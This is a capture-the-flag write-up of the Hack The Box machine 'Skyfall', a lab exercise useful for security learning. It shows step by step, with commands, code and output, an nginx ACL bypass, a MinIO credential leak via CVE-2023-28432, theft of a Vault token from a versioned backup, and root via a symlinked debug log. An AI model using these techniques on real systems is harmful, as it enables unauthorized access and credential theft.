
---

First, as always, edit /etc/hosts to add IP then skyfall.htb, then nmap scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

fire up burp, and then the browser
![skyfall_1.png](https://raw.githubusercontent.com/DisplayGFX/DisplayGFX-CTF-writeups/main/img/skyfall_1.png)

Then, start a fuzz of both subdirectories, and subdomains. Only subdomain returns an interesting result
`wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 20631 -H "Host: FUZZ.skyfall.htb" http://skyfall.htb`

Gets us

![skyfall_2.png](https://raw.githubusercontent.com/DisplayGFX/DisplayGFX-CTF-writeups/main/img/skyfall_2.png)

Edit /etc/hosts, add `demo.skyfall.htb` and here is the page I get

![skyfall_3.png](https://raw.githubusercontent.com/DisplayGFX/DisplayGFX-CTF-writeups/main/img/skyfall_3.png)

# Web Application (demo.skyfall.htb)
---
Login with the provided credentials `guest:guest` and I get into the site. first thing to note is that our session token is a flask token, which can be decoded 
with `flask-unsign` 

```zsh
$ flask-unsign --unsign --cookie ".eJwlzktqBDEMRdG9eJyBJKssuTdTWD8SAglUdY9C9h5DeKP7RuennXXl_d4ez-uVb-38iPZoiaU4SVEk3dw6IGU47PngMOWk7smTALw8CHXogkkLULPKquPybuYrgCxrTgPWXjKX5hKRLoNiCkOJ0DGIK2PwmGlKLm1DXnde_xrc6fdV5_P7M7_2cbBrdWXqwFPAsAQ313WsWigYWhiHe_v9A1h8P60.Zb8EpA.l4LS0K7VU-r4G1R9cc61P656YQw"
[*] Session decodes to: {'_fresh': True, '_id': 'e1f81928177ecbcb3012edc0c0cc64db84e23ce49200cfcd21868a092a018effbf31ac3bbcad02bef99b0483f79a8ea7773762d9740f7725624fed6469eb82c7', '_user_id': '1', 'csrf_token': '54c8f3842304970b1f71192c86afa171d8f1d5cc'}
```

After browsing, I see two pages that I am not allowed visit, `MinIO Metrics` and `Beta`. Looking at MinIO page in burp, I see that the response has this line.

```html

<html>
	<head>
		<title>403 Forbidden</title>
	</head>
	<body>
		<center>
			<h1>
				403 Forbidden
			</h1>
		</center>
		<hr>
		<center>
			nginx/1.18.0 (Ubuntu)
		</center>
	</body>
</html>

```

So its a Flask app running within a nginx app. Thus it is vulnerable to a [ACL Bypass attack](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#heading-bypassing-nginx-acl-rules-with-nodejs)

Here is the rule I am attempting to bypass

```
location = /metrics {
  deny all;
}

location = /metrics/ {
  deny all;
}
```

As within this link, I add a `\x0B` byte in Burpsuite's Repeater module right after the page I want to visit.

![skyfall_4.png](https://raw.githubusercontent.com/DisplayGFX/DisplayGFX-CTF-writeups/main/img/skyfall_4.png)

And this gets us to the page with a 200 OK, meaning I bypassed the outer nginx rules which it sees as `/metricsOB`, and Flask rendered/removed the hex and just sees `/metrics` and returns the page
![skyfall_5.png](https://raw.githubusercontent.com/DisplayGFX/DisplayGFX-CTF-writeups/main/img/skyfall_5.png) 

Scrolling to the bottom of the page, I see the url that is behind the Flask app: `http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster`
![skyfall_6.png](https://raw.githubusercontent.com/DisplayGFX/DisplayGFX-CTF-writeups/main/img/skyfall_6.png)

# MinIO (S3 API application)
---
Now that I know the URL of MinIO, add it to `/etc/hosts` and query it with my browser, and I get a whole bunch of data. to interact with MinIO, I can either use a CLI tool, here I will use python code. However, to access the MinIO server, I need both a token and a secret to pass to the server.

That I can obtain from the webapp, by asking for the tokens myself, via [CVE-2023-28432](https://github.com/acheiii/CVE-2023-28432)

By simply giving the python script the URL through `urls.txt`, it will identify a vulnerable URL. Altering the `.py` file to print the response it gets, you can get back the response. With the values from `MINIO_SECRET_KEY` and `MINIO_ROOT_PASSWORD` in hand, I have enough to make requests to the MinIO server.

First, make sure to install MinIO python libraries with
```zsh 
pip3 install minio
```

After observing quite a bit out of the available resources and the cluster URL obtained above, each bucket correlates to a user. 

```python
import minio

mio = minio.Minio("prd23-s3-backend.skyfall.htb","[MINIO_ROOT_USER]","[MINIO_ROOT_PASSWORD]",secure=False)
for i in mio.list_objects("guest"): 
	print(i.object_name, i.version_id, i.last_modified, i.size)
```
outputs:
```
Welcome.pdf 2023-11-08 00:08:05.221000+00:00 49647
helloworld 2024-02-03 19:26:14.104000+00:00 5126
helloworld.txt 2024-02-03 19:26:45.183000+00:00 0
{{7*7}} 2024-02-03 19:59:07.053000+00:00 7438
```


after doing enumeration with the above information, clusters, it seems that user `askyy` has `home_backup.tar.gz`. storing the backup with 

```python
for i in mio.list_objects("askyy"): 
	print(i.object_name, i.last_modified, i.size)
contents = mio.get_object("askyy","home_backup.tar.gz")
open("./home/home_backup.tar.gz","wb").write(contents.read())
```

Gets me
```zsh
$ tar -tvf home_backup.tar.gz
drwxr-x--- askyy/askyy       0 2023-11-09 16:30 ./
-rw-r--r-- askyy/askyy     807 2022-01-06 11:23 ./.profile
-rw-r--r-- askyy/askyy    3771 2023-11-09 16:30 ./.bashrc
drwx------ askyy/askyy       0 2023-11-09 16:28 ./.ssh/
-rw------- askyy/askyy       1 2023-11-09 16:28 ./.ssh/authorized_keys
-rw-r--r-- askyy/askyy       0 2023-10-09 14:47 ./.sudo_as_admin_successful
-rw-rw-r-- askyy/askyy       1 2023-11-09 16:26 ./.bash_history
-rw-r--r-- askyy/askyy     220 2022-01-06 11:23 ./.bash_logout
drwx------ askyy/askyy       0 2023-10-09 14:47 ./.cache/
-rw-r--r-- askyy/askyy       0 2023-10-09 14:47 ./.cache/motd.legal-displayed
```

Mostly standard files looking through them all. however, if we add ` include_version=True`
to our `list_object` function and print the `i.version_id`, we get 
```zsh
$ python3 minio_scrape.py
Welcome.pdf bba1fcc2-331d-41d4-845b-0887152f19ec 2023-11-08 05:35:28.041000+00:00 49647
home_backup.tar.gz 25835695-5e73-4c13-82f7-30fd2da2cf61 2023-11-09 21:37:25.090000+00:00 2543
home_backup.tar.gz 2b75346d-2a47-4203-ab09-3c9f878466b8 2023-11-09 21:37:09.793000+00:00 2705
home_backup.tar.gz 3c498578-8dfe-43b7-b679-32a3fe42018f 2023-11-09 21:36:30.126000+00:00 1233285
```

which we can extract by specifying the `version_id` in `get_object`
```python
contents = mio.get_object("askyy","home_backup.tar.gz", version_id="25835695-5e73-4c13-82f7-30fd2da2cf61")
open("./home/home.tar.gz","wb").write(contents.read())
```

inspecting the other two versions, the last one we get
```zsh
$ tar -tvf home.tar.gz 
drwxr-x--- askyy/askyy       0 2023-11-09 16:23 ./
-rw-r--r-- askyy/askyy     807 2022-01-06 11:23 ./.profile
drwxrwxr-x askyy/askyy       0 2023-11-09 16:23 ./terraform-generator/
-rw-rw-r-- askyy/askyy    5304 2023-11-08 00:44 ./terraform-generator/.eslintrc.json
-rw-rw-r-- askyy/askyy    1511 2023-11-08 00:44 ./terraform-generator/package.json
[SNIP]
-rw-rw-r-- askyy/askyy     601 2023-11-08 00:44 ./terraform-generator/.github/ISSUE_TEMPLATE/feature_request.md
-rw-rw-r-- askyy/askyy     391 2023-11-08 00:44 ./terraform-generator/.github/ISSUE_TEMPLATE/bug_report.md
-rw-r--r-- askyy/askyy    3771 2022-01-06 11:23 ./.bashrc
drwx------ askyy/askyy       0 2023-11-09 16:22 ./.ssh/
-rw-rw-r-- askyy/askyy    2655 2023-11-08 00:22 ./.ssh/id_rsa
-rw-rw-r-- askyy/askyy     567 2023-11-08 00:22 ./.ssh/id_rsa.pub
-rw------- askyy/askyy     567 2023-11-08 00:23 ./.ssh/authorized_keys
-rw-rw-r-- askyy/askyy       1 2023-11-09 16:23 ./.viminfo
-rw-r--r-- askyy/askyy       0 2023-10-09 14:47 ./.sudo_as_admin_successful
-rw-rw-r-- askyy/askyy   10296 2023-11-08 00:42 ./.bash_history
-rw-r--r-- askyy/askyy     220 2022-01-06 11:23 ./.bash_logout
drwx------ askyy/askyy       0 2023-10-09 14:47 ./.cache/
-rw-r--r-- askyy/askyy       0 2023-10-09 14:47 ./.cache/motd.legal-displayed

```
Which has, in interest to me, an `id_rsa` to `askyy`, `.bash_history`, and some other files.

Sadly, this backup is a rabbithole, the `id_rsa` requires a password, and `.bash_history` is exclusively for an intro to beginners linux course.

Onto the next archive, which is much more managable.
```zsh
$ tar -tvf home2.tar.gz
drwxr-x--- askyy/askyy       0 2023-11-09 16:29 ./
-rw-r--r-- askyy/askyy     807 2022-01-06 11:23 ./.profile
-rw-r--r-- askyy/askyy    3953 2023-11-09 16:28 ./.bashrc
drwx------ askyy/askyy       0 2023-11-09 16:28 ./.ssh/
-rw------- askyy/askyy       1 2023-11-09 16:28 ./.ssh/authorized_keys
-rw-r--r-- askyy/askyy       0 2023-10-09 14:47 ./.sudo_as_admin_successful
-rw-rw-r-- askyy/askyy       1 2023-11-09 16:26 ./.bash_history
-rw-r--r-- askyy/askyy     220 2022-01-06 11:23 ./.bash_logout
drwx------ askyy/askyy       0 2023-10-09 14:47 ./.cache/
-rw-r--r-- askyy/askyy       0 2023-10-09 14:47 ./.cache/motd.legal-displayed
```
it is very subtle but `.bashrc` has a size difference between the most recent version, and the version before it, illustrated here
```zsh
-rw-r--r-- askyy/askyy    3771 2023-11-09 16:30 ./.bashrc
-rw-r--r-- askyy/askyy    3953 2023-11-09 16:28 ./.bashrc
```

There is extra data here!

running diff on the two .bashrc files gets us
```zsh
diff .bashrc home2/.bashrc 
42a43,45
> export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
> export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
> 
```

Another service. Looking around, and this seems to be a HashiCorp Vault URL, and its associated vault token.

# HashiCorp Vault
---
Install:
https://developer.hashicorp.com/vault/install

And run the command with `vault`. Make sure to export the above variables, and export the URL under `VAULT_ADDR` for the CLI tool. If you did it correctly, you should be able to log in with `vault login` 

The first thing I noticed is that almost every subcommand of `vault` gives you a 403
```zsh
$ vault secrets list        
Error listing secrets engines: Error making API request.
  
URL: GET http://prd23-vault-internal.skyfall.htb/v1/sys/mounts                                                                    
Code: 403. Errors:                                                                                   
* 1 error occurred:                                                                  * permission denied  
```

However, theres no need to guess and check. It seems that by default, most vaults will allow me to look up your own ACL that results of my roles. 

default policy (unavailable to current user, given for illustrative purposes)
```
# Allow a token to look up its resultant ACL from all policies. This is useful
# for UIs. It is an internal path because the format may change at any time
# based on how the internal ACL features and capabilities change.
path "sys/internal/ui/resultant-acl" {
    capabilities = ["read"]
}
```

While `vault` does not give direct access, I can just get the resultant ACLs myself with `curl` 
you can access them by this curl command
```zsh
curl \
--header "X-Vault-Token: $VAULT_TOKEN" \
"$VAULT_ADDR/v1/sys/internal/ui/resultant-acl"
```

Highlights of this request
```
 "ssh/creds/dev_otp_key_role" : {
	"capabilities" : [
	   "create",
	   "read",
	   "update"
	]
 },
...
"glob_paths" : {
 "ssh/" : {
	"capabilities" : [
	   "list"
	]
 },
}
```

vault has an SSH command, and it seems like we have full permissions for the dev_otp_key_role. In addition, we can list all of ssh.
```zsh
$ vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role

```
Notice the admin key role, we will return to this later.

looking back at the vault commands, we can see [ssh documentation](https://developer.hashicorp.com/vault/docs/commands/ssh). Using this documentation, I can get an ssh session. Install sshpass for an easier experience. Following the documentation...
```zsh
vault ssh -role=dev_otp_key_role askyy@skyfall.htb 
```
I get user!
```bash
askyy@skyfall:~$ whoami
askyy
askyy@skyfall:~$ cat user.txt
```

# Privilege Escalation
---
Doing a standard recon of the user, I immediately notice that `sudo -l` does not ask for a password, and returns permissions
```bash
askyy@skyfall:~$ sudo -l
...
User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```

so sudo allows me to run `vault-unseal` with specific inputs, and allows for options afterwards. `[-vhd]*` means that the commands can start with any of the characters in the bracket, then anything afterwards. using the above command with `-h` at the end gives us
```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message

```

Looking at this, it seems we can access the options `verbose` and `debug`. if I run both of them in my home directory, I get
```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
askyy@skyfall:~$ ls -la
...
-rw------- 1 root  root  4095 Feb  4 06:25 debug.log
...
```

running with just verbose adds these two lines
```bash
[-] Master token found in config: ****************************
[>] Enable 'debug' mode for details
```

so this debug.log is the one we want. however, the permissions only allow root to read the file. However, theres a workaround. 

Because the program just writes to debug.log without checking things like if it exists already, its easy to theorize that it doesnt check the file at all. Unfortunately from our current user, we cannot verify this. 

However, we can take advantage of this. First, create a symlink in a fresh folder, then make a file that your symlink points to. This should set up the pretext for our exploit.
```bash
askyy@skyfall:~$ mkdir sym
askyy@skyfall:~$ ln -s sym/test.123 sym/debug.log
askyy@skyfall:~$ touch sym/test.123
askyy@skyfall:~$ ls -la sym/
total 8
drwxrwxr-x 2 askyy askyy 4096 Feb  4 06:33 .
drwxr-x--- 5 askyy askyy 4096 Feb  4 06:33 ..
lrwxrwxrwx 1 askyy askyy   12 Feb  4 06:33 debug.log -> test.123
-rw-rw-r-- 1 askyy askyy    0 Feb  4 06:33 test.123
```

Then, move to the folder, and run debug on the command again.

```bash
askyy@skyfall:~$ cd sym/
askyy@skyfall:~/sym$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
[>] Checking seal status
[+] Vault sealed: false
askyy@skyfall:~/sym$ cat test.123
2024/02/04 06:35:58 Initializing logger...
2024/02/04 06:35:58 Reading: /etc/vault-unseal.yaml
2024/02/04 06:35:58 Security Risk!
2024/02/04 06:35:58 Master token found in config: [removed]
...

```

The token looks just like our other HashiCorp Vault token.

Dropping out of the user shell, I set my `VAULT_KEY` to the master key, and then use the ssh command again. Assuming we can just use the other OTP role we identified above, we ssh into root.

```bash
export VAULT_TOKEN=[Master Token]
vault ssh -role=admin_otp_key_role root@skyfall.htb 
```

And we get root! 
```bash
root@skyfall:~# whoami
root
root@skyfall:~# id
uid=0(root) gid=0(root) groups=0(root)
```
# 🥳
https://www.hackthebox.com/achievement/machine/158887/586